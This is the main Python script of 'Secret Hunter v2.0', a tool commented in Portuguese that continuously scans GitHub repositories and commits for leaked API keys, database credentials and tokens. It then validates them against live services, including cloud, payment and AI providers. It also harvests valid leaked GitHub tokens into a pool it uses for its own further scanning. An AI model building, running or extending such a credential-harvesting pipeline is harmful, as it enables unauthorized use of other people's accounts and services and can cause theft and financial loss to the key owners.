#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║   ███████  ███████  ████████  ███████  ███████                ║
║   ██      ██   ██     ██     ██   ██  ██                      ║
║   █████   ███████     ██     ███████  ███████               ║
║   ██      ██  ██      ██     ██  ██       ██                  ║
║   ███████ ██   ██     ██     ██   ██  ███████                 ║
║                                                                  ║
║   ⚡ Secret Hunter v2.0 — Automated Key Discovery & Validation  ║
║   🔍 Caça chaves expostas no GitHub (2026+), valida e dashboard ║
╚══════════════════════════════════════════════════════════════════╝

Uso:
  python main.py scan           → Scan único
  python main.py scan --watch   → Scan contínuo (GitHub API)
  python main.py scan --free    → Scan contínuo FREE (git clone local)
  python main.py dashboard      → Dashboard web :8080
  python main.py validate       → Valida keys pendentes
  python main.py stats          → Estatísticas no terminal
"""

import asyncio
import logging
import os
import sys
import time
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%H:%M:%S",
)

import store
from patterns import PATTERNS, CATEGORIES


def banner():
    print(r"""
╔══════════════════════════════════════════════════════════════════╗
║   ███████  ███████  ████████  ███████  ███████                ║
║   ██      ██   ██     ██     ██   ██  ██                      ║
║   █████   ███████     ██     ███████  ███████               ║
║   ██      ██  ██      ██     ██  ██       ██                  ║
║   ███████ ██   ██     ██     ██   ██  ███████                 ║
║                                                                  ║
║   ⚡ Secret Hunter v2.0 — Automated Key Discovery & Validation  ║
╚══════════════════════════════════════════════════════════════════╝
""")


def get_tokens() -> list:
    raw = os.environ.get("GITHUB_TOKENS", "")
    return [t.strip() for t in raw.split(",") if t.strip()]


async def run_scan(mode="both"):
    from scanner import GitHubScanner
    tokens = get_tokens()
    if not tokens:
        print("⚠️  GITHUB_TOKENS vazio! Use: export GITHUB_TOKENS='ghp_xxx,ghp_yyy'")
    min_date = os.environ.get("SCANNER_MIN_DATE", "2026-01-01")
    scan_id = uuid.uuid4().hex[:12]
    start = time.time()

    print(f"🔍 SCAN [{scan_id[:8]}] | Modo: {mode} | Patterns: {len(PATTERNS)}")
    print("─" * 60)

    store.save_scan_log({
        "scan_id": scan_id, "scan_type": f"github_{mode}",
        "query": f"mode={mode}, date>{min_date}", "pattern_count": len(PATTERNS),
        "status": "running",
    })
    try:
        scanner = GitHubScanner(tokens=tokens, min_date=min_date)
        findings = await scanner.run(mode=mode, scan_id=scan_id)
        await scanner.close()
        new_count = 0
        repos = set()
        for f in findings:
            sid = store.save_secret(f)
            if sid:
                new_count += 1
            if f.get("repo_name"):
                repos.add(f["repo_name"])
        elapsed = time.time() - start
        store.update_scan_log(scan_id, {
            "total_found": len(findings), "new_found": new_count,
            "repos_scanned": len(repos), "duration_seconds": elapsed,
            "status": "completed",
        })
        print(f"✅ SCAN CONCLUÍDO: {len(findings)} total, {new_count} novos, {len(repos)} repos, {elapsed:.1f}s")
        if new_count > 0:
            print(f"🔍 Validando {min(new_count, 50)} keys...")
            await run_validate(limit=50)
        return scan_id
    except Exception as e:
        store.update_scan_log(scan_id, {"status": "failed", "error": str(e)[:500], "duration_seconds": time.time() - start})
        print(f"❌ Erro: {e}")
        raise


async def run_forever(mode="both"):
    from scanner import GitHubScanner
    from validator import KeyValidator
    import collections

    tokens = get_tokens()
    if not tokens:
        print("⚠️  GITHUB_TOKENS vazio!")
    min_date = os.environ.get("SCANNER_MIN_DATE", "2026-01-01")
    scan_id = uuid.uuid4().hex[:12]

    store.save_scan_log({
        "scan_id": scan_id, "scan_type": f"continuous_{mode}",
        "query": f"forever mode={mode}", "pattern_count": len(PATTERNS),
        "status": "running",
    })

    val_queue = collections.deque(maxlen=1000)
    total_new = 0
    repos_seen = set()
    start = time.time()
    validator = KeyValidator()

    async def on_finding_cb(f):
        nonlocal total_new
        sid = store.save_secret(f)
        if sid:
            total_new += 1
        if f.get("repo_name"):
            repos_seen.add(f["repo_name"])
        if sid and f.get("key_type"):
            val_queue.append((sid, f.get("validator_type", f["key_type"]), f["key_value"]))
        print(f"  💎 [{f['key_type']}] {f['key_name']}: {f['masked_value']}  ← {f.get('repo_name','?')}")
        if len(val_queue) >= 10:
            await drain_validation_queue()

    async def on_cycle_cb(cycle_n, count):
        await drain_validation_queue()
        store.update_scan_log(scan_id, {
            "total_found": total_new, "new_found": total_new,
            "repos_scanned": len(repos_seen), "duration_seconds": time.time() - start,
            "status": "running",
        })
        if cycle_n % 10 == 0:
            import sqlite3 as _sqlite3
            conn = _sqlite3.connect(store.DB_PATH)
            conn.row_factory = _sqlite3.Row
            ghs = conn.execute("SELECT id, key_value FROM secrets WHERE key_type='github' AND (is_valid=0 OR is_valid IS NULL) LIMIT 50").fetchall()
            conn.close()
            if ghs:
                print(f"  🔄 Revalidando {len(ghs)} GitHub PATs...")
                for r in ghs:
                    val_queue.append((r["id"], "github", r["key_value"]))
                await drain_validation_queue()
            ps = token_pool.stats()
            if ps["harvested_count"] > 0:
                print(f"  🔑 Pool: {ps['seed_count']} seed + {ps['harvested_count']} colhidos = {ps['total_active']} ativos")

    async def drain_validation_queue():
        if not val_queue:
            return
        items = []
        while val_queue:
            items.append(val_queue.popleft())
        print(f"  ✓ Validando {len(items)} keys...")
        results = await validator.validate_batch(items, max_workers=10)
        v = inv = 0
        for db_id, r in results:
            store.update_validation(db_id, r.get("is_valid"), r.get("message", ""))
            if r.get("is_valid") is True:
                v += 1
            elif r.get("is_valid") is False:
                inv += 1
        if v or inv:
            print(f"  ✅ {v} válidas, {inv} inválidas")

    scanner = GitHubScanner(tokens=tokens, min_date=min_date)

    try:
        pending = store.get_unvalidated(limit=1000)
        if pending:
            print(f"  🔄 Revalidando {len(pending)} pendentes antigas...")
            for p in pending:
                val_queue.append((p["id"], p.get("validator_type") or p["key_type"], p["key_value"]))
            await drain_validation_queue()

        await scanner.run_forever(mode=mode, on_finding=on_finding_cb, on_cycle=on_cycle_cb)
        await drain_validation_queue()
    except asyncio.CancelledError:
        print("\n👋 Encerrando...")
    except Exception as e:
        print(f"❌ Erro: {e}")
        store.update_scan_log(scan_id, {"status": "failed", "error": str(e)[:500]})
    finally:
        await drain_validation_queue()
        await scanner.close()
        await validator.close()
        elapsed = time.time() - start
        store.update_scan_log(scan_id, {
            "total_found": total_new, "new_found": total_new,
            "repos_scanned": len(repos_seen), "duration_seconds": elapsed,
            "status": "stopped",
        })
        print(f"\n📊 Pipeline parado: {total_new} keys novas em {elapsed:.0f}s")


async def run_forever_free():
    from clone_scanner import CloneScanner
    from validator import KeyValidator
    import collections

    min_date = os.environ.get("SCANNER_MIN_DATE", "2026-01-01")
    scan_id = uuid.uuid4().hex[:12]

    store.save_scan_log({
        "scan_id": scan_id, "scan_type": "free_clone",
        "query": "git-clone-local", "pattern_count": len(PATTERNS),
        "status": "running",
    })

    val_queue = collections.deque(maxlen=1000)
    total_new = 0
    repos_seen = set()
    start = time.time()
    validator = KeyValidator()

    async def drain_validation_queue():
        if not val_queue:
            return
        items = []
        while val_queue:
            items.append(val_queue.popleft())
        print(f"  ✓ Validando {len(items)} keys...")
        results = await validator.validate_batch(items, max_workers=10)
        v = inv = 0
        for db_id, r in results:
            store.update_validation(db_id, r.get("is_valid"), r.get("message", ""))
            if r.get("is_valid") is True:
                v += 1
            elif r.get("is_valid") is False:
                inv += 1
        if v or inv:
            print(f"  ✅ {v} válidas, {inv} inválidas")

    async def on_finding_cb(f):
        nonlocal total_new
        sid = store.save_secret(f)
        if sid:
            total_new += 1
        if f.get("repo_name"):
            repos_seen.add(f["repo_name"])
        if sid and f.get("key_type"):
            val_queue.append((sid, f.get("validator_type", f["key_type"]), f["key_value"]))
        print(f"  💎 [{f['key_type']}] {f['key_name']}: {f['masked_value']}  ← {f.get('repo_name','?')}")
        if len(val_queue) >= 10:
            await drain_validation_queue()

    async def on_cycle_cb(cycle_n, count):
        await drain_validation_queue()
        store.update_scan_log(scan_id, {
            "total_found": total_new, "new_found": total_new,
            "repos_scanned": len(repos_seen), "duration_seconds": time.time() - start,
            "status": "running",
        })
        # A cada 5 ciclos: revalida pendentes (is_valid=NULL) que têm validador
        if cycle_n % 5 == 0:
            import sqlite3 as _sqlite3
            conn = _sqlite3.connect(store.DB_PATH)
            conn.row_factory = _sqlite3.Row
            # Busca secrets com is_valid=NULL (indefinidos) — podem ter ficado pendentes
            rows = conn.execute("""
                SELECT id, key_type, key_value, validator_type FROM secrets 
                WHERE is_valid IS NULL 
                AND key_type IN ('mongodb','postgresql','redis','mysql','aws','whatsapp',
                                 'firebase','telegram','gcp','jwt','ssh','discord','slack',
                                 'anthropic','gitlab','openai','huggingface','twilio','stripe',
                                 'npm','docker','digitalocean','sendgrid','mailgun','sqlite',
                                 'pix','elastic','cert','pgp')
                ORDER BY key_type LIMIT 200
            """).fetchall()
            conn.close()
            if rows:
                print(f"  🔄 Revalidando {len(rows)} secrets indefinidos...")
                for r in rows:
                    val_queue.append((r["id"], r["validator_type"] or r["key_type"], r["key_value"]))
                await drain_validation_queue()
            # GitHub PATs: revalida pra colher tokens válidos pro pool
            conn = _sqlite3.connect(store.DB_PATH)
            conn.row_factory = _sqlite3.Row
            ghs = conn.execute("SELECT id, key_value FROM secrets WHERE key_type='github' AND (is_valid=0 OR is_valid IS NULL) LIMIT 50").fetchall()
            conn.close()
            if ghs:
                print(f"  🔄 Revalidando {len(ghs)} GitHub PATs...")
                for r in ghs:
                    val_queue.append((r["id"], "github", r["key_value"]))
                await drain_validation_queue()
            import token_pool
            ps = token_pool.stats()
            if ps["harvested_count"] > 0:
                print(f"  🔑 Pool: {ps['seed_count']} seed + {ps['harvested_count']} colhidos = {ps['total_active']} ativos")

    scanner = CloneScanner(tokens=get_tokens(), min_date=min_date)

    try:
        # NÃO valida pendentes no startup — começa a escanear IMEDIATAMENTE
        # Validação roda em background durante os ciclos
        print("  ⚡ Iniciando scan imediatamente (validação roda em background)...")

        await scanner.run_forever_free(on_finding=on_finding_cb, on_cycle=on_cycle_cb)
        await drain_validation_queue()
    except asyncio.CancelledError:
        print("\n👋 Encerrando pipeline free...")
    except Exception as e:
        print(f"❌ Erro: {e}")
        store.update_scan_log(scan_id, {"status": "failed", "error": str(e)[:500]})
    finally:
        await drain_validation_queue()
        await scanner.close()
        await validator.close()
        elapsed = time.time() - start
        store.update_scan_log(scan_id, {
            "total_found": total_new, "new_found": total_new,
            "repos_scanned": len(repos_seen), "duration_seconds": elapsed,
            "status": "stopped",
        })
        print(f"\n📊 Pipeline free parado: {total_new} keys novas em {elapsed:.0f}s")


async def run_validate(limit=50):
    from validator import KeyValidator
    secrets = store.get_secrets(validated=False, limit=limit)
    if not secrets:
        print("✅ Nenhuma key pendente.")
        return
    print(f"🔍 Validando {len(secrets)} keys...")
    v = KeyValidator()
    items = [(s["id"], s["key_type"], s["key_value"]) for s in secrets]
    results = await v.validate_batch(items, max_workers=20)
    valid = invalid = unkn = 0
    for db_id, r in results:
        store.update_validation(db_id, r.get("is_valid"), r.get("message", ""))
        if r.get("is_valid") is True: valid += 1
        elif r.get("is_valid") is False: invalid += 1
        else: unkn += 1
    await v.close()
    print(f"✅ Validação: {valid} válidas, {invalid} inválidas, {unkn} não-testáveis")


def show_stats():
    stats = store.get_dashboard_stats()
    by_type = store.get_stats_by_type()

    print("\n📊  SECRET HUNTER — Stats")
    print("─" * 50)
    print(f"  🔑 Total Keys:     {stats['total_secrets']}")
    print(f"  ✅ Válidas:         {stats['valid']}")
    print(f"  ❌ Inválidas:       {stats['invalid']}")
    print(f"  ⏳ Pendentes:       {stats['pending']}")
    print(f"  📦 Repositórios:   {stats['unique_repos']}")
    print(f"  📊 Tipos distintos: {stats['unique_types']}")
    print(f"  🔍 Scans totais:   {stats['total_scans']}")
    print(f"  ⚡ Últimas 24h:    {stats['recent_24h']}")

    if by_type:
        print(f"\n  {'Tipo':<20} {'Total':>6} {'Valid':>6} {'✅Válid':>6}")
        print("─" * 42)
        for t in by_type:
            print(f"  {t['key_type']:<20} {t['total']:>6} {t['validated_count']:>6} {t['valid_count']:>6}")

    recent = store.get_secrets(limit=10)
    if recent:
        print("\n🆕  Últimos Secrets:")
        for s in recent:
            mark = "✅" if s["is_valid"] == 1 else "❌" if s["is_valid"] == 0 else "⏳"
            print(f"  {mark} [{s['key_type']}] {s['key_name']} — {(s.get('source') or '')[:60]}")
    print()


def run_dashboard():
    from server import run_server
    import config
    run_server(host=config.DASHBOARD_HOST, port=config.DASHBOARD_PORT)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Secret Hunter v2 — Key Discovery & Validation")
    sub = parser.add_subparsers(dest="cmd")

    sp = sub.add_parser("scan", help="Scan GitHub")
    sp.add_argument("--mode", choices=["code", "commits", "both"], default="both")
    sp.add_argument("--watch", action="store_true", help="Modo contínuo")
    sp.add_argument("--free", action="store_true", help="FREE (git clone + grep, sem API)")
    sp.add_argument("--interval", type=int, default=30, help="Intervalo (min)")

    sub.add_parser("dashboard", help="Dashboard web")
    vp = sub.add_parser("validate", help="Valida pendentes")
    vp.add_argument("--limit", type=int, default=50)
    sub.add_parser("stats", help="Estatísticas")

    args = parser.parse_args()
    banner()

    if args.cmd == "scan":
        if args.free:
            print("🆓 Pipeline FREE — git clone + grep local (sem custos)\n")
            try:
                asyncio.run(run_forever_free())
            except KeyboardInterrupt:
                print("\n👋 Encerrando...")
        elif args.watch:
            print("🔄 Pipeline contínuo 24h (Ctrl+C para parar)\n")
            try:
                asyncio.run(run_forever(mode=args.mode))
            except KeyboardInterrupt:
                print("\n👋 Encerrando...")
        else:
            asyncio.run(run_scan(mode=args.mode))
    elif args.cmd == "dashboard":
        run_dashboard()
    elif args.cmd == "validate":
        asyncio.run(run_validate(limit=args.limit))
    elif args.cmd == "stats":
        show_stats()
    else:
        parser.print_help()


if __name__ == "__main__":
    main()